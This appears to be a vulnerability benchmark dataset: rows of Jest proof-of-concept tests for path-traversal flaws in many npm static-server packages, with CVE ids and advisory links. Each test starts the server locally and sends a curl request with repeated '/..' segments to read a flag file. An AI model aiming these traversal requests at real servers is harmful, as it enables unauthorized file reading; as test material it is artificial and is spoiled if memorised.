const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serveryyl"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serveryyl/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:6:8,https://security.snyk.io/vuln/npm:serveryyl:20180306; 
path-traversal,CVE-2017-16211,lessindex,1.0.0,n/a,path-traversal/lessindex_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lessindex"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/lessindex/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:lessindex:20170425; https://github.com/advisories/GHSA-frcq-4ffq-v4mw
path-traversal,,node-staticserver,1.0.3,n/a,path-traversal/node-staticserver_1.0.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-staticserver"", (done) => {
  expect.assertions(1);
  const pkg = require(""node-staticserver"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8983/tcp"", () => {});
  } catch (e) {}
  let app = pkg();
  app.listen(8983);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8983${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/server.js:183:25,https://security.snyk.io/vuln/npm:node-staticserver:20180226; 
path-traversal,,webrepl,0.4.7,n/a,path-traversal/webrepl_0.4.7,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in webrepl"", (done) => {
  expect.assertions(1);
  const pkg = require(""webrepl"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8974/tcp"", () => {});
  } catch (e) {}
  pkg.start(8974);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8974${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,webrepl.js:177:12,https://security.snyk.io/vuln/npm:webrepl:20180315; 
path-traversal,CVE-2017-16029,hostr,2.0.0,2.3.6,path-traversal/hostr_2.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in hostr"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/hostr/bin/hostr"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/henrytseng/hostr/commit/789a00047459fd80b6f0a9701a1378a47fb73ba8,lib/routes/static.js:56:27,https://security.snyk.io/vuln/npm:hostr:20161211; https://github.com/advisories/GHSA-xqqr-p362-6rmc
path-traversal,,srverqq,1.0.0,n/a,path-traversal/srverqq_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in srverqq"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/srverqq/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:32:8,https://security.snyk.io/vuln/npm:srverqq:20170730; 
path-traversal,,node-http-server,8.1.2,n/a,path-traversal/node-http-server_8.1.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-http-server"", (done) => {
  expect.assertions(1);
  const pkg = require(""node-http-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8986/tcp"", () => {});
  } catch (e) {}
  pkg.deploy({
    port: 8986,
    root: __dirname,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8986${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server/Server.js:494:8,https://security.snyk.io/vuln/npm:node-http-server:20180226; 
path-traversal,,myserve111,1.1.2,n/a,path-traversal/myserve111_1.1.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9999/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in myserve111"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9999/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/myserve111/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:myserve111:20180306; 
path-traversal,,wenluhong11,1.0.0,n/a,path-traversal/wenluhong11_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wenluhong11"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wenluhong11/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:wenluhong11:20180226; 
path-traversal,,canvas-designer,1.2.1,n/a,path-traversal/canvas-designer_1.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in canvas-designer"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/canvas-designer/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:36:8,https://security.snyk.io/vuln/npm:canvas-designer:20180226; 
path-traversal,,caihong,1.0.0,n/a,path-traversal/caihong_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in caihong"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/caihong/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:caihong:20180226; 
path-traversal,,der-server,0.0.9,n/a,path-traversal/der-server_0.0.9,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in der-server"", (done) => {
  expect.assertions(1);
  var pkg = require(""der-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8887/tcp"", () => {});
  } catch (e) {}
  pkg.start(__dirname, ""../flag.html"", 8887);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8887${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,der-server.js:52:12,https://security.snyk.io/vuln/npm:der-server:20180226; 
path-traversal,,zs123,1.0.0,n/a,path-traversal/zs123_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zs123"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zs123/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,node.js:13:8,https://security.snyk.io/vuln/npm:zs123:20180315; 
path-traversal,,sabu,1.0.6,n/a,path-traversal/sabu_1.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in sabu"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/sabu/bin/sabu"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,utils.js:52:12,https://security.snyk.io/vuln/npm:sabu:20180226; 
path-traversal,,wuzhuang,1.0.0,n/a,path-traversal/wuzhuang_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wuzhuang"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wuzhuang/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:12:8,https://security.snyk.io/vuln/npm:wuzhuang:20180226; 
path-traversal,,serverlyj333,1.1.0,n/a,path-traversal/serverlyj333_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverlyj333"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverlyj333/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",n/a,index.js:9:8,https://security.snyk.io/vuln/npm:serverlyj333:20180315; 
path-traversal,,node-cxc,1.0.0,n/a,path-traversal/node-cxc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 80/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in node-cxc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 80/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/node-cxc/app.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:80${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,app.js:24:8,https://security.snyk.io/vuln/npm:node-cxc:20180226; 
path-traversal,CVE-2017-16215,sgqserve,1.0.0,n/a,path-traversal/sgqserve_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in sgqserve"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/sgqserve/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:22:8,https://security.snyk.io/vuln/npm:sgqserve:20170518; https://github.com/advisories/GHSA-m8pw-hgvj-cwcm
path-traversal,,zxyserver,1.0.0,n/a,path-traversal/zxyserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in zxyserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/zxyserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    done();
  });
});
",n/a,index.js:10:9,https://security.snyk.io/vuln/npm:zxyserver:20180306; 
path-traversal,,simple-mock-server,0.2.1,n/a,path-traversal/simple-mock-server_0.2.1,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in simple-mock-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/simple-mock-server/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,lib/simple-mock-server.js:62:31,https://security.snyk.io/vuln/npm:simple-mock-server:20180226; 
path-traversal,CVE-2017-16178,intsol-package,1.0.0,n/a,path-traversal/intsol-package_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in intsol-package"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/intsol-package/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:35:41,https://security.snyk.io/vuln/npm:intsol-package:20170511; https://github.com/advisories/GHSA-23wc-v4mf-x7v4
path-traversal,,sleep,^6.3.0,n/a,path-traversal/aso-server_0.4.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in aso-server"", (done) => {
  expect.assertions(1);
  var pkg = require('aso-server')
  const fs = require(""fs"");
  const { sleep } = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = pkg
     .onError(e => console.log(e))
     .onStop(() => {})
     .start('localhost', 3000, srv => {});
  sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000/f/${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});",n/a,,https://security.snyk.io/vuln/npm:aso-server:20180226; 
path-traversal,CVE-2017-16162,22lixian,1.0.0,n/a,path-traversal/22lixian_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in 22lixian"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/22lixian/demo.js"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,demo.js:6:8,https://security.snyk.io/vuln/npm:22lixian:20170511; https://github.com/advisories/GHSA-rrfc-g2gh-xvjm
path-traversal,CVE-2017-16217,fbr-client,1.0.3,n/a,path-traversal/fbr-client_1.0.3,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fbr-client"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/fbr-client/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,server.js:53:12,https://security.snyk.io/vuln/npm:fbr-client:20170510; https://github.com/advisories/GHSA-qmhf-qg6f-pc4v
path-traversal,,serverzyqzyq,1.1.0,n/a,path-traversal/serverzyqzyq_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverzyqzyq"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverzyqzyq/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:5:8,https://security.snyk.io/vuln/npm:serverzyqzyq:20180315; 
path-traversal,CVE-2020-7683,rollup-plugin-server,0.7.0,n/a,path-traversal/rollup-plugin-server_0.7.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rollup-plugin-server"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  server({
    host: ""localhost"",
    port: 9000,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,dist/index.cjs.js:111:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVER-590123; https://github.com/advisories/GHSA-34gh-3cwv-wvp2
path-traversal,CVE-2020-7687,fast-http,0.1.3,n/a,path-traversal/fast-http_0.1.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in fast-http"", (done) => {
  expect.assertions(1);
  const Server = require(""fast-http"");
  const fs = require(""fs"");
  const { exec, execSync } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let srv = new Server(8080, ""./"", true);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",n/a,index.js:35:16,https://security.snyk.io/vuln/SNYK-JS-FASTHTTP-572892; https://github.com/advisories/GHSA-7phr-5m9x-rw9q
path-traversal,CVE-2017-16039,hftp,0.0.6,n/a,path-traversal/hftp_0.0.6,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in hftp"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/hftp/bin/hftp"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  let val = exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
}, 10000);
",n/a,lib/static_server.js:91:16,https://security.snyk.io/vuln/npm:hftp:20170422; https://github.com/advisories/GHSA-76p6-gpvf-6wmv
